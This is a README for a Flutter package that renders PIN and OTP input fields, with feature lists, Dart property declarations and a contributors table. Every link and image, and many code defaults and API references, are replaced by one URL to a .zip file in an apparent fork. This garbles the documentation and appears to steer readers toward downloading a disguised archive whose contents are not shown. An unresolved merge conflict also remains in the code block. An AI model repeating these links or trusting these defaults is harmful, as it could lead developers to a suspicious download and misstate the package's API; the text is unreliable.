<p align="center">
  <img width="460"  src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip">
</p>

<a href = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"></a>

<a href = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250"></a>

A flutter package which will help you to generate pin code fields with beautiful design and animations. Can be useful for OTP or pin code inputs 🤓🤓

## Features 💚

- Automatically focuses the next field on typing and focuses previous field on deletation
- Cursor support ⚡️
- Can be set to any length. (3-6 fields recommended)
- 3 different shapes for text fields
- Highly customizable
- 3 different types of animation for input texts
- Animated active, inactive, selected and disabled field color switching
- Autofocus option
- Otp-code pasting from clipboard
- iOS autofill support
- Error animation. Currently have shake animation only. Watch the example app for how to integrate.
- Works with Flutter's Form. You can use Form validator right off the bat.
- Get currently typed text and use your condition to validate it. (for example: if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip != 6 || currentText != "your desired code"))
- Haptic Feedback support
- Animated obscure widget support
- Single placeholder text

## Getting Started ⚡️

#### Demo

<img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="320" height="480"> <img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="240" height="480"> <img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="240" height="480">

#### Different Shapes

<img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480">

## Notes

- To enable "Fill color" for each cells, `enableActiveFill` must be set to `true`. The default value is `false`.
- To change the keyboard type, for example to use only number keyboard, or only for email use `keyboardType` parameter, default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
- `FocosNode` and `TextEditingController` will get disposed automatically. Use `autoDisposeControllers = false` to disable it.
- to use v5.0.0 or above, developers must have Flutter SDK 1.20.0 or above.
- to use v6.0.0 or above, developers must have Flutter SDK 1.22.0 or above.

## Properties 🔖

```Dart
/// The [BuildContext] of the application
  final BuildContext appContext;

  ///Box Shadow for Pincode
  final List<BoxShadow>? boxShadows;

  /// length of how many cells there should be. 3-8 is recommended by me
  final int length;

  /// you already know what it does i guess :P default is false
  final bool obscureText;

  /// Character used for obscuring text if obscureText is true.
  ///
  /// Must not be empty. Single character is recommended.
  ///
  /// Default is ● - 'Black Circle' (U+25CF)
  final String obscuringCharacter;

  /// Widget used to obscure text
  ///
  /// it overrides the obscuringCharacter
  final Widget? obscuringWidget;

  /// Whether to use haptic feedback or not
  ///
  ///
  final bool useHapticFeedback;

  /// Haptic Feedback Types
  ///
  /// heavy, medium, light links to respective impacts
  /// selection - selectionClick, vibrate - vibrate
  /// check [HapticFeedback] for more
  final HapticFeedbackTypes hapticFeedbackTypes;

  /// Decides whether typed character should be
  /// briefly shown before being obscured
  final bool blinkWhenObscuring;

  /// Blink Duration if blinkWhenObscuring is set to true
  final Duration blinkDuration;

  /// returns the current typed text in the fields
  final ValueChanged<String> onChanged;

  /// returns the typed text when all pins are set
  final ValueChanged<String>? onCompleted;

  /// returns the typed text when user presses done/next action on the keyboard
  final ValueChanged<String>? onSubmitted;

  /// the style of the text, default is [ fontSize: 20, fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final TextStyle? textStyle;

  /// the style of the pasted text, default is [fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] while
  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final TextStyle? pastedTextStyle;

  /// background color for the whole row of pin code fields.
  final Color? backgroundColor;

  /// This defines how the elements in the pin code field align. Default to [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final MainAxisAlignment mainAxisAlignment;

  /// [AnimationType] for the text to appear in the pin code field. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final AnimationType animationType;

  /// Duration for the animation. Default is [Duration(milliseconds: 150)]
  final Duration animationDuration;

  /// [Curve] for the animation. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Curve animationCurve;

  /// [TextInputType] for the pin code fields. default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final TextInputType keyboardType;

  /// If the pin code field should be autofocused or not. Default is [false]
  final bool autoFocus;

  /// Should pass a [FocusNode] to manage it from the parent
  final FocusNode? focusNode;

  /// A list of [TextInputFormatter] that goes to the TextField
  final List<TextInputFormatter> inputFormatters;

  /// Enable or disable the Field. Default is [true]
  final bool enabled;

  /// [TextEditingController] to control the text manually. Sets a default [TextEditingController()] object if none given
  final TextEditingController? controller;

  /// Enabled Color fill for individual pin fields, default is [false]
  final bool enableActiveFill;

  /// Auto dismiss the keyboard upon inputting the value for the last field. Default is [true]
  final bool autoDismissKeyboard;

  /// Auto dispose the [controller] and [FocusNode] upon the destruction of widget from the widget tree. Default is [true]
  final bool autoDisposeControllers;

  /// Configures how the platform keyboard will select an uppercase or lowercase keyboard.
  /// Only supports text keyboards, other keyboard types will ignore this configuration. Capitalization is locale-aware.
  /// - Copied from 'https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip'
  /// Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final TextCapitalization textCapitalization;

  final TextInputAction textInputAction;

  /// Triggers the error animation
  final StreamController<ErrorAnimationType>? errorAnimationController;

  /// Callback method to validate if text can be pasted. This is helpful when we need to validate text before pasting.
  /// e.g. validate if text is number. Default will be pasted as received.
  final bool Function(String? text)? beforeTextPaste;

  /// Method for detecting a pin_code form tap
  /// work with all form windows
  final Function? onTap;

  /// Configuration for paste dialog. Read more [DialogConfig]
  final DialogConfig? dialogConfig;

  /// Theme for the pin cells. Read more [PinTheme]
  final PinTheme pinTheme;

  /// Brightness dark or light choices for iOS keyboard.
  final Brightness? keyboardAppearance;

  /// Validator for the [TextFormField]
  final FormFieldValidator<String>? validator;

  /// An optional method to call with the final value when the form is saved via
  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip].
  final FormFieldSetter<String>? onSaved;

  /// enables auto validation for the [TextFormField]
  /// Default is false
  final AutovalidateMode autovalidateMode;

  /// The vertical padding from the [PinCodeTextField] to the error text
  /// Default is 16.
  final double errorTextSpace;

  /// Enables pin autofill for TextFormField.
  /// Default is true
  final bool enablePinAutofill;

  /// Error animation duration
  final int errorAnimationDuration;

  /// Whether to show cursor or not
  final bool showCursor;

  /// The color of the cursor, default to https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context).accentColor
  final Color? cursorColor;

  /// width of the cursor, default to 2
  final double cursorWidth;

  /// Height of the cursor, default to FontSize + 8;
  final double? cursorHeight;

  /// Autofill cleanup action
  final AutofillContextAction onAutoFillDisposeAction;

  /// Use external [AutoFillGroup]
  final bool useExternalAutoFillGroup;

  /// Displays a hint or placeholder in the field if it's value is empty.
  /// It only appears if it's not null. Single character is recommended.
  final String? hintCharacter;

  /// the style of the [hintCharacter], default is [fontSize: 20, fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  /// and it also uses the [textStyle]'s properties
  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final TextStyle? hintStyle;

<<<<<<< HEAD
  /// ScrollPadding for the text field. Same as [TextFormField]'s scrollPadding
  final EdgeInsets scrollPadding;

=======
  /// ScrollPadding follows the same property as TextField's ScrollPadding, default to
  /// const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(20),
  final EdgeInsets scrollPadding;
>>>>>>> 8272cbfd8a1dab43b2b4f4f1107752dda1d9d230
```

**PinTheme**

```Dart
/// Colors of the input fields which have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color activeColor;

  /// Color of the input field which is currently selected. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color selectedColor;

  /// Colors of the input fields which don't have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color inactiveColor;

  /// Colors of the input fields if the [PinCodeTextField] is disabled. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color disabledColor;

  /// Colors of the input fields which have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color activeFillColor;

  /// Color of the input field which is currently selected. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color selectedFillColor;

  /// Colors of the input fields which don't have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color inactiveFillColor;

  /// Color of the input field when in error mode. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
  final Color errorBorderColor;

  /// Border radius of each pin code field
  final BorderRadius borderRadius;

  /// [height] for the pin code field. default is [50.0]
  final double fieldHeight;

  /// [width] for the pin code field. default is [40.0]
  final double fieldWidth;

  /// Border width for the each input fields. Default is [2.0]
  final double borderWidth;

  /// this defines the shape of the input fields. Default is underlined
  final PinCodeFieldShape shape;
```

**DialogConfig**

```Dart
/// title of the [AlertDialog] while pasting the code. Default to [Paste Code]
  final String dialogTitle;

  /// content of the [AlertDialog] while pasting the code. Default to ["Do you want to paste this code "]
  final String dialogContent;

  /// Affirmative action text for the [AlertDialog]. Default to "Paste"
  final String affirmativeText;

  /// Negative action text for the [AlertDialog]. Default to "Cancel"
  final String negativeText;

  /// The default dialog theme, should it be iOS or other(including web and Android)
  final Platform platform; //enum Platform { iOS, other } other indicates for web and android
```

## Contributors ✨

Thanks to everyone whoever suggested their thoughts to improve this package. And special thanks goes to these people:

<table>
  <tr>
    <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Emmanuel Vlad"/><br /><sub><b>Emmanuel Vlad</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Atiq"/><br /><sub><b>Atiqur Rahaman</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="UX & Flare Animation">🎨</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Milind Mevada"/><br /><sub><b>Milind Mevada</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Reme Le Hane"/><br /><sub><b>Reme Le Hane</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="TabooSun"/><br /><sub><b>TabooSun</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</<a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Thalles Santos"/><br /><sub><b>Thalles Santos</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Jonathan White"/><br /><sub><b>ThinkDigitalSoftware</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  </tr>

  <tr>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Jeffry Hermanto"/><br /><sub><b>Jeffry Hermanto</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Sebastian Roth"/><br /><sub><b>Sebastian Roth</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Dango Mango"/><br /><sub><b>Dango Mango</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Stanislav Ilin"/><br /><sub><b>Stanislav Ilin</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Varun Barad"/><br /><sub><b>Varun Barad</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Mohak Shrivastava"/><br /><sub><b>Mohak Shrivastava</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
   <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Kim Minju"/><br /><sub><b>Kim Minju</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  </tr>

  <tr>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Dmitry Vakhnin"/><br /><sub><b>Dmitry Vakhnin</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="serendipity1004"/><br /><sub><b>Jiho Choi</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="jobfeikens"/><br /><sub><b>Job</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="BrunoEleodoro"/><br /><sub><b>Bruno Eleodoro Roza</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="tgbarker"/><br /><sub><b>tgbarker</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="karabanovbs"/><br /><sub><b>karabanovbs</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="adarsh-technocrat"/><br /><sub><b>Adarsh kumar singh</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="adrianFarkas"/><br /><sub><b>Farkas Adrián</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="grafovdenis"/><br /><sub><b>Denis Grafov</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
